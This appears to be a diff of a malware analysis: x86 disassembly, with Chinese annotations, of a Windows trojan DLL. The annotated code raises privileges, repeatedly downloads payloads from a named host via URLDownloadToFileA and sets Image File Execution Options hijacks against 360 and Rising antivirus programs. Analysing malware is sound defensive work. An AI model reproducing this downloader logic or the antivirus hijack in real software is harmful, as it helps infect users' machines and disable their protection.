-1000254B    E8 E85F0E00     call    100E8538                         ；设置 "SeDebugPrivilege"，提升权限  
-10002550    008B 35541000   add     byte ptr \[ebx+105435\], cl  
-10002556    106A 00         adc     byte ptr \[edx\], ch  
-10002559    6A 00           push    0  
-1000255B    6A 00           push    0  
-1000255D    68 00220010     push    10002200  
-  
-{  
-10002200  /.  55            push    ebp  
-10002201  |.  8BEC          mov     ebp, esp  
-10002203  |.  81EC D4020000 sub     esp, 2D4  
-10002209  |.  53            push    ebx  
-1000220A  |.  56            push    esi  
-1000220B  |.  57            push    edi  
-1000220C  |.  68 14120010   push    10001214                         ; /MutexName = "QQ935623508"  
-10002211  |.  6A 00         push    0                                ; |InitialOwner = FALSE  
-10002213  |.  6A 00         push    0                                ; |pSecurity = NULL  
-10002215  |.  FF15 68100010 call    dword ptr \[10001068\]             ; \\CreateMutexA  
-1000221B  |.  BB 01000000   mov     ebx, 1  
-10002220  |.  895D FC       mov     dword ptr \[ebp-4\], ebx  
-10002223  |>  68 60EA0000   /push    0EA60                           ; /Timeout = 60000. ms  
-10002228  |.  FF15 94100010 |call    dword ptr \[10001094\]            ; \\Sleep  
-1000222E  |.  B9 0D000000   |mov     ecx, 0D  
-10002233  |.  BE DC110010   |mov     esi, 100011DC  
-10002238  |.  8DBD F8FEFFFF |lea     edi, dword ptr \[ebp-108\]  
-1000223E  |.  33C0          |xor     eax, eax  
-10002240  |.  F3:A5         |rep     movs dword ptr es:\[edi\], dword >  
-10002242  |.  A4            |movs    byte ptr es:\[edi\], byte ptr \[es>  
-10002243  |.  B9 0B000000   |mov     ecx, 0B  
-10002248  |.  8DBD 2DFFFFFF |lea     edi, dword ptr \[ebp-D3\]  
-1000224E  |.  F3:AB         |rep     stos dword ptr es:\[edi\]  
-10002250  |.  66:AB         |stos    word ptr es:\[edi\]  
-10002252  |.  AA            |stos    byte ptr es:\[edi\]  
-10002253  |.  B9 18000000   |mov     ecx, 18  
-10002258  |.  33C0          |xor     eax, eax  
-1000225A  |.  8DBD 5DFFFFFF |lea     edi, dword ptr \[ebp-A3\]  
-10002260  |.  C685 5CFFFFFF>|mov     byte ptr \[ebp-A4\], 0  
-10002267  |.  F3:AB         |rep     stos dword ptr es:\[edi\]  
-10002269  |.  66:AB         |stos    word ptr es:\[edi\]  
-1000226B  |.  AA            |stos    byte ptr es:\[edi\]  
-1000226C  |.  8D85 5CFFFFFF |lea     eax, dword ptr \[ebp-A4\]  
-10002272  |.  8D8D F8FEFFFF |lea     ecx, dword ptr \[ebp-108\]  
-10002278  |.  50            |push    eax  
-10002279  |.  51            |push    ecx  
-1000227A  |.  E8 B1FDFFFF   |call    10002030            ；连接网络地址 "http://winddk.ch.ma/dd.txt"  
-1000227F  |.  83C4 08       |add     esp, 8  
-10002282  |.  68 A4110010   |push    100011A4                        ; /FileName = "urlmon.dll"  
-10002287  |.  FF15 A0100010 |call    dword ptr \[100010A0\]            ; \\LoadLibraryA  
-1000228D  |.  85C0          |test    eax, eax  
-1000228F  |.  8945 EC       |mov     dword ptr \[ebp-14\], eax  
-10002292  |.  0F84 2A010000 |je      100023C2  
-10002298  |.  90            |nop  
-10002299  |.  33C9          |xor     ecx, ecx  
-1000229B  |.  A1 A0110010   |mov     eax, dword ptr \[100011A0\]  
-100022A0  |.  894D C8       |mov     dword ptr \[ebp-38\], ecx  
-100022A3  |.  8B15 9C110010 |mov     edx, dword ptr \[1000119C\]  
-100022A9  |.  894D CC       |mov     dword ptr \[ebp-34\], ecx  
-100022AC  |.  8945 C4       |mov     dword ptr \[ebp-3C\], eax  
-100022AF  |.  894D D0       |mov     dword ptr \[ebp-30\], ecx  
-100022B2  |.  66:A1 9811001>|mov     ax, word ptr \[10001198\]  
-100022B8  |.  894D D4       |mov     dword ptr \[ebp-2C\], ecx  
-100022BB  |.  66:8945 E4    |mov     word ptr \[ebp-1C\], ax  
-100022BF  |.  894D D8       |mov     dword ptr \[ebp-28\], ecx  
-100022C2  |.  A0 92110010   |mov     al, byte ptr \[10001192\]  
-100022C7  |.  66:894D DC    |mov     word ptr \[ebp-24\], cx  
-100022CB  |.  894D E6       |mov     dword ptr \[ebp-1A\], ecx  
-100022CE  |.  8B0D 8C110010 |mov     ecx, dword ptr \[1000118C\]  
-100022D4  |.  8955 C0       |mov     dword ptr \[ebp-40\], edx  
-100022D7  |.  8B15 94110010 |mov     edx, dword ptr \[10001194\]  
-100022DD  |.  894D F0       |mov     dword ptr \[ebp-10\], ecx  
-100022E0  |.  33C9          |xor     ecx, ecx  
-100022E2  |.  8845 F6       |mov     byte ptr \[ebp-A\], al  
-100022E5  |.  66:894D F7    |mov     word ptr \[ebp-9\], cx  
-100022E9  |.  8D7D E0       |lea     edi, dword ptr \[ebp-20\]  
-100022EC  |.  884D F9       |mov     byte ptr \[ebp-7\], cl  
-100022EF  |.  83C9 FF       |or      ecx, FFFFFFFF  
-100022F2  |.  33C0          |xor     eax, eax  
-100022F4  |.  8955 E0       |mov     dword ptr \[ebp-20\], edx  
-100022F7  |.  66:8B15 90110>|mov     dx, word ptr \[10001190\]  
-100022FE  |.  F2:AE         |repne   scas byte ptr es:\[edi\]  
-10002300  |.  F7D1          |not     ecx  
-10002302  |.  66:8955 F4    |mov     word ptr \[ebp-C\], dx  
-10002306  |.  2BF9          |sub     edi, ecx  
-10002308  |.  8D55 C0       |lea     edx, dword ptr \[ebp-40\]  
-1000230B  |.  8BF7          |mov     esi, edi  
-1000230D  |.  8BD9          |mov     ebx, ecx  
-1000230F  |.  8BFA          |mov     edi, edx  
-10002311  |.  83C9 FF       |or      ecx, FFFFFFFF  
-10002314  |.  8D55 C0       |lea     edx, dword ptr \[ebp-40\]  
-10002317  |.  F2:AE         |repne   scas byte ptr es:\[edi\]  
-10002319  |.  8BCB          |mov     ecx, ebx  
-1000231B  |.  4F            |dec     edi  
-1000231C  |.  C1E9 02       |shr     ecx, 2  
-1000231F  |.  F3:A5         |rep     movs dword ptr es:\[edi\], dword >  
-10002321  |.  8BCB          |mov     ecx, ebx  
-10002323  |.  52            |push    edx                             ; /ProcNameOrOrdinal  
-10002324  |.  83E1 03       |and     ecx, 3                          ; |  
-10002327  |.  F3:A4         |rep     movs byte ptr es:\[edi\], byte pt>; |  
-10002329  |.  8D7D F0       |lea     edi, dword ptr \[ebp-10\]         ; |  
-1000232C  |.  83C9 FF       |or      ecx, FFFFFFFF                   ; |  
-1000232F  |.  F2:AE         |repne   scas byte ptr es:\[edi\]          ; |  
-10002331  |.  F7D1          |not     ecx                             ; |  
-10002333  |.  2BF9          |sub     edi, ecx                        ; |  
-10002335  |.  8BF7          |mov     esi, edi                        ; |  
-10002337  |.  8BD9          |mov     ebx, ecx                        ; |  
-10002339  |.  8BFA          |mov     edi, edx                        ; |  
-1000233B  |.  83C9 FF       |or      ecx, FFFFFFFF                   ; |  
-1000233E  |.  F2:AE         |repne   scas byte ptr es:\[edi\]          ; |  
-10002340  |.  8BCB          |mov     ecx, ebx                        ; |  
-10002342  |.  4F            |dec     edi                             ; |  
-10002343  |.  C1E9 02       |shr     ecx, 2                          ; |  
-10002346  |.  F3:A5         |rep     movs dword ptr es:\[edi\], dword >; |  
-10002348  |.  8BCB          |mov     ecx, ebx                        ; |  
-1000234A  |.  8B5D EC       |mov     ebx, dword ptr \[ebp-14\]         ; |  
-1000234D  |.  83E1 03       |and     ecx, 3                          ; |  
-10002350  |.  53            |push    ebx                             ; |hModule  
-10002351  |.  F3:A4         |rep     movs byte ptr es:\[edi\], byte pt>; |  
-10002353  |.  FF15 AC100010 |call    dword ptr \[100010AC\]            ; \\GetProcAddress  
-10002359    A3 68340010     mov     dword ptr \[10003468\], eax        ; urlmon.URLDownloadToFileA  
-1000235E  |.  8D85 F4FDFFFF |lea     eax, dword ptr \[ebp-20C\]  
-10002364  |.  68 04010000   |push    104                             ; /BufSize = 104 (260.)  
-10002369  |.  50            |push    eax                             ; |Buffer  
-1000236A  |.  FF15 6C100010 |call    dword ptr \[1000106C\]            ; \\GetWindowsDirectoryA  
-10002370  |.  BF CC110010   |mov     edi, 100011CC                   ;  ASCII "\\Fonts\\isb.ini"，病毒下载列表  
-10002375  |.  83C9 FF       |or      ecx, FFFFFFFF  
-10002378  |.  33C0          |xor     eax, eax  
-1000237A  |.  8D95 F4FDFFFF |lea     edx, dword ptr \[ebp-20C\]  
-10002380  |.  F2:AE         |repne   scas byte ptr es:\[edi\]  
-10002382  |.  F7D1          |not     ecx  
-10002384  |.  2BF9          |sub     edi, ecx  
-10002386  |.  8BF7          |mov     esi, edi  
-10002388  |.  8BFA          |mov     edi, edx  
-1000238A  |.  8BD1          |mov     edx, ecx  
-1000238C  |.  83C9 FF       |or      ecx, FFFFFFFF  
-1000238F  |.  F2:AE         |repne   scas byte ptr es:\[edi\]  
-10002391  |.  8BCA          |mov     ecx, edx  
-10002393  |.  4F            |dec     edi  
-10002394  |.  C1E9 02       |shr     ecx, 2  
-10002397  |.  F3:A5         |rep     movs dword ptr es:\[edi\], dword >  
-10002399  |.  8BCA          |mov     ecx, edx  
-1000239B  |.  50            |push    eax  
-1000239C  |.  83E1 03       |and     ecx, 3  
-1000239F  |.  50            |push    eax  
-100023A0  |.  F3:A4         |rep     movs byte ptr es:\[edi\], byte pt>  
-100023A2  |.  8D85 F4FDFFFF |lea     eax, dword ptr \[ebp-20C\]  
-100023A8  |.  8D8D 5CFFFFFF |lea     ecx, dword ptr \[ebp-A4\]  
-100023AE  |.  50            |push    eax  
-100023AF  |.  51            |push    ecx  
-100023B0  |.  6A 00         |push    0  
-100023B2  |.  FF15 68340010 |call    dword ptr \[10003468\]  
-100023B8  |.  53            |push    ebx                             ; /hLibModule  
-100023B9  |.  FF15 7C100010 |call    dword ptr \[1000107C\]            ; \\FreeLibrary  
-100023BF  |.  8B5D FC       |mov     ebx, dword ptr \[ebp-4\]  
-100023C2  |>  8D95 F4FDFFFF |lea     edx, dword ptr \[ebp-20C\]  
-100023C8  |.  52            |push    edx                             ; /FileName  
-100023C9  |.  FF15 70100010 |call    dword ptr \[10001070\]            ; \\GetFileAttributesA  
-100023CF  |.  83F8 FF       |cmp     eax, -1  
-100023D2  |.  75 24         |jnz     short 100023F8  
-100023D4  |.  83FB 0A       |cmp     ebx, 0A  
-100023D7  |.  0F84 A0000000 |je      1000247D  
-100023DD  |.  43            |inc     ebx  
-100023DE  |.  83FB 0C       |cmp     ebx, 0C  
-100023E1  |.  895D FC       |mov     dword ptr \[ebp-4\], ebx  
-100023E4  |.^ 0F8C 39FEFFFF \\jl      10002223  
-100023EA  |.  5F            pop     edi  
-100023EB  |.  5E            pop     esi  
-100023EC  |.  B8 01000000   mov     eax, 1  
-100023F1  |.  5B            pop     ebx  
-100023F2  |.  8BE5          mov     esp, ebp  
-100023F4  |.  5D            pop     ebp  
-100023F5  |.  C2 0400       retn    4  
-100023F8  |>  8D85 F4FDFFFF lea     eax, dword ptr \[ebp-20C\]  
-100023FE  |.  68 C8110010   push    100011C8  
-10002403  |.  50            push    eax  
-10002404  |.  E8 47100000   call    10003450  
-10002409  |.  8BF0          mov     esi, eax  
-1000240B  |.  83C4 08       add     esp, 8  
-1000240E  |.  85F6          test    esi, esi  
-10002410  |.  75 22         jnz     short 10002434  
-10002412  |.  50            push    eax                              ; /Style  
-10002413  |.  68 C0110010   push    100011C0                         ; |Title = "fuck"  
-10002418  |.  68 BC110010   push    100011BC                         ; |Text = "net"  
-1000241D  |.  6A FF         push    -1                               ; |hOwner = FFFFFFFF  
-1000241F  |.  FF15 E0100010 call    dword ptr \[100010E0\]             ; \\MessageBoxA  
-10002425  |.  68 B8110010   push    100011B8                         ;  ASCII "51"  
-1000242A  |.  E8 1B100000   call    1000344A  
-1000242F  |.  83C4 04       add     esp, 4  
-10002432  |.  EB 40         jmp     short 10002474  
-10002434  |>  8D8D 2CFDFFFF lea     ecx, dword ptr \[ebp-2D4\]  
-1000243A  |.  51            push    ecx  
-1000243B  |.  68 B4110010   push    100011B4                         ;  ASCII "%s",LF  
-10002440  |.  56            push    esi  
-10002441  |.  E8 FE0F0000   call    10003444  
-10002446  |.  83C4 0C       add     esp, 0C  
-10002449  |.  83F8 01       cmp     eax, 1  
-1000244C  |.  75 26         jnz     short 10002474  
-1000244E  |>  8D95 2CFDFFFF /lea     edx, dword ptr \[ebp-2D4\]  
-10002454  |.  52            |push    edx  
-10002455  |.  E8 36FCFFFF   |call    10002090  
-1000245A  |.  8D85 2CFDFFFF |lea     eax, dword ptr \[ebp-2D4\]  
-10002460  |.  50            |push    eax  
-10002461  |.  68 B4110010   |push    100011B4                        ;  ASCII "%s",LF  
-10002466  |.  56            |push    esi  
-10002467  |.  E8 D80F0000   |call    10003444  
-1000246C  |.  83C4 10       |add     esp, 10  
-1000246F  |.  83F8 01       |cmp     eax, 1  
-10002472  |.^ 74 DA         \\je      short 1000244E  
-10002474  |>  56            push    esi  
-10002475  |.  E8 C40F0000   call    1000343E  
-1000247A  |.  83C4 04       add     esp, 4  
-1000247D  |>  5F            pop     edi  
-1000247E  |.  5E            pop     esi  
-1000247F  |.  B8 01000000   mov     eax, 1  
-10002484  |.  5B            pop     ebx  
-10002485  |.  8BE5          mov     esp, ebp  
-10002487  |.  5D            pop     ebp  
-10002488  \\.  C2 0400       retn    4  
-  
-}  
-10002562    6A 00           push    0  
-10002564    6A 00           push    0  
-10002566    FFD6            call    esi  
-10002568    6A 00           push    0  
-1000256A    6A 00           push    0  
-1000256C    6A 00           push    0  
-1000256E    68 102D0010     push    10002D10  
-  {  
-10002D10    56              push    esi                              ; kernel32.Sleep  
-10002D11    8B35 94100010   mov     esi, dword ptr \[10001094\]        ; kernel32.Sleep  
-10002D17    68 401F0000     push    1F40  
-10002D1C    FFD6            call    esi  
-10002D1E    E8 CDFCFFFF     call    100029F0                 ;创建安全软件的镜像劫持  
-"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"  
- {  
-100029F0    68 04190010     push    10001904                         ; ASCII "360rpt.EXE"  
-100029F5    E8 D6FDFFFF     call    100027D0    
- "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"  
-100029FA    68 F0180010     push    100018F0                         ; ASCII "LiveUpdate360.EXE"  
-100029FF    E8 CCFDFFFF     call    100027D0  
-10002A04    68 E4180010     push    100018E4                         ; ASCII "360safe.EXE"  
-10002A09    E8 C2FDFFFF     call    100027D0  
-10002A0E    68 D8180010     push    100018D8                         ; ASCII "360tray.EXE"  
-10002A13    E8 B8FDFFFF     call    100027D0  
-10002A18    68 C8180010     push    100018C8                         ; ASCII "360safebox.EXE"  
-10002A1D    E8 AEFDFFFF     call    100027D0  
-10002A22    68 B8180010     push    100018B8                         ; ASCII "safeboxTray.EXE"  
-10002A27    E8 A4FDFFFF     call    100027D0  
-10002A2C    68 A8180010     push    100018A8                         ; ASCII "AvMonitor.EXE"  
-10002A31    E8 9AFDFFFF     call    100027D0  
-10002A36    68 98180010     push    10001898                         ; ASCII "Ravservice.EXE"  
-10002A3B    E8 90FDFFFF     call    100027D0  
-10002A40    68 8C180010     push    1000188C                         ; ASCII "RAVTRAY.EXE"  
+
+10002200  /.  55            push    ebp  
+
+10002201  |.  8BEC          mov     ebp, esp  
+
+10002203  |.  81EC D4020000 sub     esp, 2D4  
+
+10002209  |.  53            push    ebx  
+
+1000220A  |.  56            push    esi  
+
+1000220B  |.  57            push    edi  
+
+1000220C  |.  68 14120010   push    10001214                         ; /MutexName = "QQ935623508"  
+
+10002211  |.  6A 00         push    0                                 ; |InitialOwner = FALSE  
+
+10002213  |.  6A 00         push    0                                 ; |pSecurity = NULL  
+
+10002215  |.  FF15 68100010 call    dword ptr [10001068]             ; \\CreateMutexA  
+
+1000221B  |.  BB 01000000   mov     ebx, 1  
+
+10002220  |.  895D FC       mov     dword ptr [ebp-4], ebx  
+
+10002223  |>  68 60EA0000   /push   0EA60                             ; /Timeout = 60000. ms  
+
+10002228  |.  FF15 94100010 |call   dword ptr [10001094]             ; \\Sleep  
+
+1000222E  |.  B9 0D000000   |mov    ecx, 0D  
+
+10002233  |.  BE DC110010   |mov    esi, 100011DC  
+
+10002238  |.  8DBD F8FEFFFF |lea    edi, dword ptr [ebp-108]  
+
+1000223E  |.  33C0          |xor    eax, eax  
+
+10002240  |.  F3:A5         |rep    movs dword ptr es:[edi], dword >  
+
+10002242  |.  A4            |movs   byte ptr es:[edi], byte ptr [es>  
+
+10002243  |.  B9 0B000000   |mov    ecx, 0B  
+
+10002248  |.  8DBD 2DFFFFFF |lea    edi, dword ptr [ebp-D3]  
+
+1000224E  |.  F3:AB         |rep    stos dword ptr es:[edi]  
+
+10002250  |.  66:AB         |stos   word ptr es:[edi]  
+
+10002252  |.  AA            |stos   byte ptr es:[edi]  
+
+10002253  |.  B9 18000000   |mov    ecx, 18  
+
+10002258  |.  33C0          |xor    eax, eax  
+
+1000225A  |.  8DBD 5DFFFFFF |lea    edi, dword ptr [ebp-A3]  
+
+10002260  |.  C685 5CFFFFFF>|mov    byte ptr [ebp-A4], 0  
+
+10002267  |.  F3:AB         |rep    stos dword ptr es:[edi]  
+
+10002269  |.  66:AB         |stos   word ptr es:[edi]  
+
+1000226B  |.  AA            |stos   byte ptr es:[edi]  
+
+1000226C  |.  8D85 5CFFFFFF |lea    eax, dword ptr [ebp-A4]  
+
+10002272  |.  8D8D F8FEFFFF |lea    ecx, dword ptr [ebp-108]  
+
+10002278  |.  50            |push   eax  
+
+10002279  |.  51            |push   ecx  
+
+1000227A  |.  E8 B1FDFFFF   |call   10002030                         ；连接网络地址 "http://winddk.ch.ma/dd.txt"  
+
+1000227F  |.  83C4 08       |add    esp, 8  
+
+10002282  |.  68 A4110010   |push   100011A4                         ; /FileName = "urlmon.dll"  
+
+10002287  |.  FF15 A0100010 |call   dword ptr [100010A0]             ; \\LoadLibraryA  
+
+1000228D  |.  85C0          |test   eax, eax  
+
+1000228F  |.  8945 EC       |mov    dword ptr [ebp-14], eax  
+
+10002292  |.  0F84 2A010000 |je     100023C2  
+
+10002298  |.  90            |nop  
+
+10002299  |.  33C9          |xor    ecx, ecx  
+
+1000229B  |.  A1 A0110010   |mov    eax, dword ptr [100011A0]  
+
+100022A0  |.  894D C8       |mov    dword ptr [ebp-38], ecx  
+
+100022A3  |.  8B15 9C110010 |mov    edx, dword ptr [1000119C]  
+
+100022A9  |.  894D CC       |mov    dword ptr [ebp-34], ecx  
+
+100022AC  |.  8945 C4       |mov    dword ptr [ebp-3C], eax  
+
+100022AF  |.  894D D0       |mov    dword ptr [ebp-30], ecx  
+
+100022B2  |.  66:A1 9811001>|mov    ax, word ptr [10001198]  
+
+100022B8  |.  894D D4       |mov    dword ptr [ebp-2C], ecx  
+
+100022BB  |.  66:8945 E4    |mov    word ptr [ebp-1C], ax  
+
+100022BF  |.  894D D8       |mov    dword ptr [ebp-28], ecx  
+
+100022C2  |.  A0 92110010   |mov    al, byte ptr [10001192]  
+
+100022C7  |.  66:894D DC    |mov    word ptr [ebp-24], cx  
+
+100022CB  |.  894D E6       |mov    dword ptr [ebp-1A], ecx  
+
+100022CE  |.  8B0D 8C110010 |mov    ecx, dword ptr [1000118C]  
+
+100022D4  |.  8955 C0       |mov    dword ptr [ebp-40], edx  
+
+100022D7  |.  8B15 94110010 |mov    edx, dword ptr [10001194]  
+
+100022DD  |.  894D F0       |mov    dword ptr [ebp-10], ecx  
+
+100022E0  |.  33C9          |xor    ecx, ecx  
+
+100022E2  |.  8845 F6       |mov    byte ptr [ebp-A], al  
+
+100022E5  |.  66:894D F7    |mov    word ptr [ebp-9], cx  
+
+100022E9  |.  8D7D E0       |lea    edi, dword ptr [ebp-20]  
+
+100022EC  |.  884D F9       |mov    byte ptr [ebp-7], cl  
+
+100022EF  |.  83C9 FF       |or     ecx, FFFFFFFF  
+
+100022F2  |.  33C0          |xor    eax, eax  
+
+100022F4  |.  8955 E0       |mov    dword ptr [ebp-20], edx  
+
+100022F7  |.  66:8B15 90110>|mov    dx, word ptr [10001190]  
+
+100022FE  |.  F2:AE         |repne  scas byte ptr es:[edi]  
+
+10002300  |.  F7D1          |not    ecx  
+
+10002302  |.  66:8955 F4    |mov    word ptr [ebp-C], dx  
+
+10002306  |.  2BF9          |sub    edi, ecx  
+
+10002308  |.  8D55 C0       |lea    edx, dword ptr [ebp-40]  
+
+1000230B  |.  8BF7          |mov    esi, edi  
+
+1000230D  |.  8BD9          |mov    ebx, ecx  
+
+1000230F  |.  8BFA          |mov    edi, edx  
+
+10002311  |.  83C9 FF       |or     ecx, FFFFFFFF  
+
+10002314  |.  8D55 C0       |lea    edx, dword ptr [ebp-40]  
+
+10002317  |.  F2:AE         |repne  scas byte ptr es:[edi]  
+
+10002319  |.  8BCB          |mov    ecx, ebx  
+
+1000231B  |.  4F            |dec    edi  
+
+1000231C  |.  C1E9 02       |shr    ecx, 2  
+
+1000231F  |.  F3:A5         |rep    movs dword ptr es:[edi], dword >  
+
+10002321  |.  8BCB          |mov    ecx, ebx  
+
+10002323  |.  52            |push   edx                               ; /ProcNameOrOrdinal  
+
+10002324  |.  83E1 03       |and    ecx, 3                            ; |  
+
+10002327  |.  F3:A4         |rep    movs byte ptr es:[edi], byte pt>; ; |  
+
+10002329  |.  8D7D F0       |lea    edi, dword ptr [ebp-10]           ; |  
+
+1000232C  |.  83C9 FF       |or     ecx, FFFFFFFF                    ; |  
+
+1000232F  |.  F2:AE         |repne  scas byte ptr es:[edi]           ; |  
+
+10002331  |.  F7D1          |not    ecx                               ; |  
+
+10002333  |.  2BF9          |sub    edi, ecx                          ; |  
+
+10002335  |.  8BF7          |mov    esi, edi                          ; |  
+
+10002337  |.  8BD9          |mov    ebx, ecx                          ; |  
+
+10002339  |.  8BFA          |mov    edi, edx                          ; |  
+
+1000233B  |.  83C9 FF       |or     ecx, FFFFFFFF                    ; |  
+
+1000233E  |.  F2:AE         |repne  scas byte ptr es:[edi]           ; |  
+
+10002340  |.  8BCB          |mov    ecx, ebx                          ; |  
+
+10002342  |.  4F            |dec    edi                               ; |  
+
+10002343  |.  C1E9 02       |shr    ecx, 2                            ; |  
+
+10002346  |.  F3:A5         |rep    movs dword ptr es:[edi], dword >; ; |  
+
+10002348  |.  8BCB          |mov    ecx, ebx                          ; |  
+
+1000234A  |.  8B5D EC       |mov    ebx, dword ptr [ebp-14]           ; |  
+
+1000234D  |.  83E1 03       |and    ecx, 3                            ; |  
+
+10002350  |.  53            |push   ebx                               ; |hModule  
+
+10002351  |.  F3:A4         |rep    movs byte ptr es:[edi], byte pt>; ; |  
+
+10002353  |.  FF15 AC100010 |call   dword ptr [100010AC]             ; \\GetProcAddress  
+
+10002359    A3 68340010     mov     dword ptr [10003468], eax        ; urlmon.URLDownloadToFileA  
+
+1000235E  |.  8D85 F4FDFFFF |lea    eax, dword ptr [ebp-20C]  
+```
+
+
+
+```
+10002364  |.  68 04010000   |push    104                       ; /BufSize = 104 (260.)  
+10002369  |.  50            |push    eax                       ; |Buffer  
+1000236A  |.  FF15 6C100010 |call    dword ptr [1000106C]        ; \\GetWindowsDirectoryA  
+10002370  |.  BF CC110010   |mov     edi, 100011CC              ;  ASCII "\\Fonts\\isb.ini"，病毒下载列表  
+10002375  |.  83C9 FF       |or      ecx, FFFFFFFF  
+10002378  |.  33C0          |xor     eax, eax  
+1000237A  |.  8D95 F4FDFFFF |lea     edx, dword ptr [ebp-20C]  
+10002380  |.  F2:AE         |repne   scas byte ptr es:[edi]  
+10002382  |.  F7D1          |not     ecx  
+10002384  |.  2BF9          |sub     edi, ecx  
+10002386  |.  8BF7          |mov     esi, edi  
+10002388  |.  8BFA          |mov     edi, edx  
+1000238A  |.  8BD1          |mov     edx, ecx  
+1000238C  |.  83C9 FF      |or      ecx, FFFFFFFF  
+1000238F  |.  F2:AE         |repne   scas byte ptr es:[edi]  
+10002391  |.  8BCA          |mov     ecx, edx  
+10002393  |.  4F            |dec     edi  
+10002394  |.  C1E9 02       |shr     ecx, 2  
+10002397  |.  F3:A5         |rep     movs dword ptr es:[edi], dword >  
+10002399  |.  8BCA          |mov     ecx, edx  
+1000239B  |.  50            |push    eax  
+1000239C  |.  83E1 03       |and     ecx, 3  
+1000239F  |.  50            |push    eax  
+100023A0  |.  F3:A4         |rep     movs byte ptr es:[edi], byte pt>  
+100023A2  |.  8D85 F4FDFFFF |lea     eax, dword ptr [ebp-20C]  
+100023A8  |.  8D8D 5CFFFFFF |lea     ecx, dword ptr [ebp-A4]  
+100023AE  |.  50            |push    eax  
+100023AF  |.  51            |push    ecx  
+100023B0  |.  6A 00         |push    0  
+100023B2  |.  FF15 68340010 |call    dword ptr [10003468]  
+100023B8  |.  53            |push    ebx                       ; /hLibModule  
+100023B9  |.  FF15 7C100010 |call    dword ptr [1000107C]        ; \\FreeLibrary  
+100023BF  |.  8B5D FC       |mov     ebx, dword ptr [ebp-4]  
+100023C2  |>   8D95 F4FDFFFF |lea     edx, dword ptr [ebp-20C]  
+100023C8  |.  52            |push    edx                       ; /FileName  
+100023C9  |.  FF15 70100010 |call    dword ptr [10001070]        ; \\GetFileAttributesA  
+100023CF  |.  83F8 FF      |cmp     eax, -1  
+100023D2  |.  75 24         |jnz     short 100023F8  
+100023D4  |.  83FB 0A      |cmp     ebx, 0A  
+100023D7  |.  0F84 A0000000 |je      1000247D  
+100023DD  |.  43            |inc     ebx  
+100023DE  |.  83FB 0C      |cmp     ebx, 0C  
+100023E1  |.  895D FC       |mov     dword ptr [ebp-4], ebx  
+100023E4  |.^ 0F8C 39FEFFFF \jl      10002223  
+100023EA  |.  5F            |pop     edi  
+100023EB  |.  5E            |pop     esi  
+100023EC  |.  B8 01000000  |mov     eax, 1  
+100023F1  |.  5B            |pop     ebx  
+100023F2  |.  8BE5          |mov     esp, ebp  
+100023F4  |.  5D            |pop     ebp  
+100023F5  |.  C2 0400       |retn    4  
+100023F8  |>   8D85 F4FDFFFF |lea     eax, dword ptr [ebp-20C]  
+100023FE  |.  68 C8110010  |push    100011C8  
+10002403  |.  50            |push    eax  
+10002404  |.  E8 47100000  |call    10003450  
+10002409  |.  8BF0          |mov     esi, eax  
+1000240B  |.  83C4 08      |add     esp, 8  
+1000240E  |.  85F6          |test    esi, esi  
+10002410  |.  75 22         |jnz     short 10002434  
+10002412  |.  50            |push    eax                       ; /Style  
+10002413  |.  68 C0110010  |push    100011C0                   ; |Title = "fuck"  
+10002418  |.  68 BC110010  |push    100011BC                   ; |Text = "net"  
+1000241D  |.  6A FF         |push    -1                         ; |hOwner = FFFFFFFF  
+1000241F  |.  FF15 E0100010 |call    dword ptr [100010E0]        ; \\MessageBoxA  
+10002425  |.  68 B8110010  |push    100011B8                   ;  ASCII "51"  
+1000242A  |.  E8 1B100000  |call    1000344A  
+1000242F  |.  83C4 04      |add     esp, 4  
+10002432  |.  EB 40         |jmp     short 10002474  
+10002434  |>   8D8D 2CFDFFFF |lea     ecx, dword ptr [ebp-2D4]  
+1000243A  |.  51            |push    ecx  
+1000243B  |.  68 B4110010  |push    100011B4                   ;  ASCII "%s",LF  
+10002440  |.  56            |push    esi  
+10002441  |.  E8 FE0F0000  |call    10003444  
+10002446  |.  83C4 0C      |add     esp, 0C  
+10002449  |.  83F8 01      |cmp     eax, 1  
+1000244C  |.  75 26         |jnz     short 10002474  
+1000244E  |>   8D95 2CFDFFFF /lea      edx, dword ptr [ebp-2D4]  
+10002454  |.  52            |push    edx  
+10002455  |.  E8 36FCFFFF  |call    10002090  
+1000245A  |.  8D85 2CFDFFFF |lea     eax, dword ptr [ebp-2D4]  
+10002460  |.  50            |push    eax  
+10002461  |.  68 B4110010  |push    100011B4                   ;  ASCII "%s",LF  
+10002466  |.  56            |push    esi  
+10002467  |.  E8 D80F0000  |call    10003444  
+1000246C  |.  83C4 10      |add     esp, 10  
+1000246F  |.  83F8 01      |cmp     eax, 1  
+10002472  |.^ 74 DA        \je      short 1000244E  
+10002474  |>   56            |push    esi  
+10002475  |.  E8 C40F0000  |call    1000343E  
+1000247A  |.  83C4 04      |add     esp, 4  
+1000247D  |>   5F            |pop     edi  
+1000247E  |.  5E            |pop     esi  
+1000247F  |.  B8 01000000  |mov     eax, 1  
+10002484  |.  5B            |pop     ebx  
+10002485  |.  8BE5          |mov     esp, ebp  
+10002487  |.  5D            |pop     ebp  
+10002488  |\.  C2 0400       |retn    4  
+```
+
+10002562    6A 00         push    0  
+10002564    6A 00         push    0  
+10002566    FFD6          call    esi  
+10002568    6A 00         push    0  
+1000256A    6A 00         push    0  
+1000256C    6A 00         push    0  
+1000256E    68 102D0010   push    10002D10  
+
+```
+10002D10    56             push    esi                       ; kernel32.Sleep  
+10002D11    8B35 94100010  mov     esi, dword ptr [10001094]    ; kernel32.Sleep  
+10002D17    68 401F0000   push    1F40  
+10002D1C    FFD6          call    esi  
+10002D1E    E8 CDFCFFFF   call    100029F0                  ;创建安全软件的镜像劫持  
+
+"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"  
+
+100029F0    68 04190010   push    10001904                   ; ASCII "360rpt.EXE"  
+100029F5    E8 D6FDFFFF   call    100027D0  
+
+"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"  
+
+100029FA    68 F0180010   push    100018F0                   ; ASCII "LiveUpdate360.EXE"  
+100029FF    E8 CCFDFFFF   call    100027D0  
+10002A04    68 E4180010   push    100018E4                   ; ASCII "360safe.EXE"  
+10002A09    E8 C2FDFFFF   call    100027D0  
+10002A0E    68 D8180010   push    100018D8                   ; ASCII "360tray.EXE"  
+10002A13    E8 B8FDFFFF   call    100027D0  
+10002A18    68 C8180010   push    100018C8                   ; ASCII "360safebox.EXE"  
